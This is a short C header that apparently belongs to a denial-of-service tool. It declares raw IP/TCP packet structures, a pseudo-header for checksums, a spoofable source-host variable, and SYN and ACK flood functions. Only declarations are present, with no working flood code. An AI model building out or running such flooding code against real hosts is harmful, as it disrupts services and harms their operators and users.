#ifndef __ATTACKS_H_
#define __ATTACKS_H_

extern unsigned long srchost;

struct send_tcp {
    struct iphdr ip;
    struct tcphdr tcp;
    char buf[20];
};

struct pseudo_header {
    unsigned int source_address;
    unsigned int dest_address;
    unsigned char placeholder;
    unsigned char protocol;
    unsigned short tcp_length;
    struct tcphdr tcp;
    char buf[20];
};

void   synflood(sock_t *, unsigned int, unsigned short, int);
void ngsynflood(sock_t *, unsigned int, unsigned short, int);
void   ackflood(sock_t *, unsigned int, unsigned short, int);
void ngackflood(sock_t *, unsigned int, unsigned short, int);

#endif
